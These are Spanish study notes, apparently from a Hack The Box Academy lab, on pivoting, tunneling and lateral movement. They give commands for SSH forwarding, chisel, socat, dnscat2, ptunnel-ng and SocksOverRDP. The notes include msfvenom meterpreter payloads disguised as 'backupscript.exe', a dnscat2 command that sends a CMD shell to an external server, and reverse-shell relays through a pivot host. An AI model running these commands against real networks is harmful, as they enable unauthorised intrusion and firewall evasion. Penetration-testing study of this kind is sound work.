### PIVOTING, TUNEL AND LATERAL MOVEMENT
Pivoting hace referencia a la capacidad de entrar de formaas mas profunda en la red
Tunelizacion se refiere a ofuscar nuestros comandos o peticiones para que parezcan legitimos
Lateral movement se refiere a poder ingresar a un host gracias a otro ya vulnerado. No se refiere a host internos dentro de la red, eso seria pivoting

Para graficar: excalidraw

	#### SSH
#### LINUX

##Local port forwarding
ssh -L 1234:localhost:3306 Ubuntu@10.129.202.64
#Recibo en mi puerto 1234 todo lo que el servidor recibe en su 3306
nmap -v -sV -p1234 localhost
#Verifico dicho port forwarding

##	Dynamic port forwarding
ssh -D 9050 ubuntu@10.129.202.64
#Establezco el puerto 9050 como puerto que va a enviar paquetes al servidor dirigidos hacia un host mas adentrado en la red
tail -4 /etc/proxychains.conf
#El puerto 9050 esta como predeterminado para usar proxychain con este objetivo
proxychains nmap -v -sn 172.16.5.1-200
#Mediante proxychain hacemos un escaneo de nmap de una ip, rango de ips, etc. Esto nos permite que los paquetes vayan destinados al host al que nosotros no alcanzamos pero si
#el servidor comprometido
#Se puede usar proxychains con todos los diferentes tools que queramos.

chisel --reverse -p <port>
#server (computadora atacante)
chisel client <ip ataque:port> R <puerto victima>:<ip:puerto victima>
#Desde el cliente (computadora vulnerada)
#De esta froma con chisel estamos realizando un port forwarding


##	Reverse shell
Para enviarnos la reverse shell del objetivo a nuestro host se debe pasar primero por el host pivote.
De esta forma, una vez ejecutando el comando para la reverse shell, este debe ir al pivote y de aca a nuestro host
Para esto podemos generar un payload mediante msfconsole, ponernos en escucha en nuestro host y conectarnos mediante ssh al pivote

ssh -R <InternalIPofPivotHost>:<PayloadPort>:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN
#Con este comando mandamos la shell del host pivote a nuestro listener (posible comando: use exploit/multi/handler) en el 8000.
#El puerto es el usado al crear el payload, a donde se conecta en el host pivote

msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InteralIPofPivotHost> -f exe -o backupscript.exe LPORT=8080
#Posible payload

El payload debe encontrarse en el target, apuntando hacia el host pivote para que nosotros tomemos esos paquetes en nuestro host local


##	Ping sweep
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
#Desde linux
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
#Desde CMD
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"}
#Desde PS


	###	SOCAT
Socat permite entablar conexiones entre dos host distintos de redes distintas sin conexions SSH funcionando como porxy que recibe en un puerto y manda a cierto host y puerto.

socat TCP4-LISTEN:8080,fork TCP4:<ip_target>:8443
#De esta forma (en nuestro host pivote) configuramos para que escuche local en el 8080 y lo envie al host objetivo en el puerto X
msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupscript.exe LPORT=8443
#Nuevamente configuramos un payload que debe se enviado al target windows apuntando al host pivote (donde esta el socat) con el respectivo puerto de escucha
use exploit/multi/handler
#Configuramos un listener mediante meterpreter que apunte al host donde esta socat con el respectivo puerto de escucha (en este caaso puerto 8080) y el payload (set payload windows/x64/meterpreter/bind_tcp)

	
	###     SSHUTTLE
Nos permite pivotar sin proxychains mediante SSH.

sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v
#Especificamos usuario, IP y la red o ip a la que queremos enrutar mediante nuestro host pivot
#Una vez hecho esto podemos usar cualquier herramienta sin configurar proxychains (https://academy.hackthebox.com/module/158/section/1432)


        ###     RPIVOT (WEB server pivoting)
sudo git clone https://github.com/klsecservices/rpivot.git
sudo apt-get install python2.7

python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
#Con el comando de arriba especificamos que el cliente se conecte al puerto 9999 y escuche en el 9050

scp -r rpivot ubuntu@<IpaddressOfTarget>:/home/ubuntu/
#De esta forma se puede copiar rpivot al objetivo mediante ssh
python2.7 client.py --server-ip 10.10.14.18 --server-port 9999
#Ejecutamos el cliente en el servidor pivot

proxychains firefox-esr 172.16.5.135:80
#De esta forma con proxychains configuramos para poder acceder al servidor web. (La ip es la ip del webserver: https://academy.hackthebox.com/module/158/section/1434)

python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>
#Muchas veces para acceder a una pagina se necesita una autenticacion NTLM. Para ello podemos usar un usr y psw de la siguiente forma



#### WINDOWS
	###	PUTTY y PLINK
Es importante saber como hacer lo anterior en windows puesto si el host pivote al que accedemos contiene este SO vamos a tener que pivotear desde aca.
Plink es una herramienta de linea de comandos que viene con PuTTY. En los host windows mas recientes no se encuentra PuTTY (por lo gral) puesto que windows ya posee su propio "ssh".
De todas formas PuTTY es muy usado actualmente por los administradores de sistemas.

plink -D 9050 ubuntu@10.129.15.50
#Iniciamos una sesion ssh con el host ubuntu y comienza a escuchar en el 9050.


	### NETSH.EXE
Es un programa en windows que nos permite crear rutas entre host asi como ver configuracion de firewall.

C:\Windows\system32> netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.15.150 connectport=3389 connectaddress=172.16.5.25
#Si queremos que al conectarnos a una maquina A:puertoA nos envie a una maquina B:puertoB
C:\Windows\system32> netsh.exe interface portproxy show v4tov4
#Verificamos si nos rutea de uno a otro
Una vez hechoe esto, si nos conectamos (con xfreerdp por ej) a la maquina 10.129.15.150:8080 nos manda hacia 172.16.5.25:3389




	#### DNS
	### Dnscat2
dnscat2 es un tool para tunneling usando DNS. Hace que el target utilice un servidor DNS externo, de esta forma se saltean los firewalls

##LINUX
git clone https://github.com/iagox86/dnscat2.git
#Link de dnscat2

cd dnscat2/server/
gem install bundler
bundle install
#Siguientes pasos de instalacion

sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache
#Iniciar servidor
#Al iniciarlo nos brinda un secret que sirve para autenticar y cifrar los datos que se envian desde el target al servidor dns

##WINDOWS
git clone https://github.com/lukebaggett/dnscat2-powershell.git
#Este proyecto es dnscat para windows, nos permite conectar windows con el servidor dns
 
Import-Module .\dnscat2.ps1
#Importamos y ejecutamos en windows

Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd
#Establecemos el tunel cn el servidor enviando la sesion shel CMD al sv
#El -PreSharedSecret flag contiene el secreto generado antes

dnscat2> window -i nro
#Una vez ejecutado el otro comando, se crea una sesion. Reemplazar el nro por el nro de la sesion



	#### HTTP
	### Chisel
Chisel es un tool para tunneling que usa http para transportar data mediante SSH

git clone https://github.com/jpillora/chisel.git
#Tool

cd chisel
go build
#Instalar

scp chisel ubuntu@10.129.202.64:~/
#Enviamos el binario creado por ssh al host pivot

./chisel server -v -p 1234 --socks5
#Se pone en escucha en el puerto 1234 (en este caso) para enviar las conexiones a todos los host a los que el pivote llegue

./chisel client -v 10.129.202.64:1234 socks
#De esta forma nos conectammos al pivote:port

socks5 127.0.0.1 1080
#Agregando esto a proxychains.conf (y comentando la entradaa tor) nos permite podes usar proxychains con chisel

En el caso de que reglas de firewall evite conexiones entrantes al pivote podemos usar laa opcion --reverse

sudo ./chisel server --reverse -v -p 1234 --socks5
#Con esta flag evitamos es regla

./chisel client -v 10.10.14.17:1234 R:socks
#Configuramos el cliente con la R para setear el reverse



	####ICMP
	###ptunnel-ng
Esta tunelizacion funciona encapsulando el trafico en paquetes ICMP. Esto solo funcionaria en una red donde el firewall permita pingear targets

git clone https://github.com/utoni/ptunnel-ng.git
#Clonar tool
sudo ./autogen.sh
#Buildeamos el tool
Una vez realizado esto podemos usarlo tanto del lado del cliente como del sv, por lo que deberiamos transferirlo.

scp -r ptunnel-ng ubuntu@10.129.202.64:~/
#Transferimos mediante SSH. -r para recursividad

~/ptunnel-ng/src$ sudo ./ptunnel-ng -r10.129.202.64 -R22
#Del lado del servidor configuramos ptunnel-ng para que escuche conexiones de la ip flag -r
sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22
#Del lago del cliente configuramos para dirigirnos a la ip objetivo (flag -p) usando el puerto 2222 (flag -l)

ssh -p2222 -lubuntu 127.0.0.1
#Confirmamos que podamos conectarnos mediante ptunnel-ng
Una vez realizado esto podemos realizar dynamic port forwarding con SSH (-D 9050) para usarlo con proxychains

	####RDP
	###SocksOverRDP
Usa Dynamic virtual channels (DVC). DVC tuneliza nuestros paquetes mediante RDP.
Para hacer esto vamos a necesitar>
1- https://www.proxifier.com/download/#win-tab
2- https://github.com/nccgroup/SocksOverRDP/releases
Nos podemos conectar mediante xfreerdp a la maquina victima y pasamos el 2.
Una vez pasado, debemos descargar en la maquina el siguiente dll mediante regsvr32.exe: 

regsvr32.exe SocksOverRDP-Plugin.dll
#Descargamos el archvio DLL necesario

mstsc.exe
#Con este comando en windows podemos loguearnos a la maquina a la cual queremos llegar. Nos aparecera un cartel avisando que sockoverRDP esta habilitado
#Va a escuchar en 127.0.0.1:1080

SocksOverRDPx64.zip o SocksOverRDP-Server.exe tiene que pasarse a la maquina a la que queremos pivotar para que comience a escuchar en 1080

netstat -antb | findstr 1080
#Verificamos que este escuchando

Ejecutamos en la windows 1 el link nro 1. Aca gif de como configurarlo en dicha maquina: https://academy.hackthebox.com/module/158/section/1439
EN la windows 2 pasamos sockoverrdp server y lo ejectuamos
Una vez hecho todo esto, ejecutamos mstsc.exe nuevamente para conectarnos a la maquina que queremos pivotar (windows 3). A la cual solo llegamos usando como intermedio a windows 2
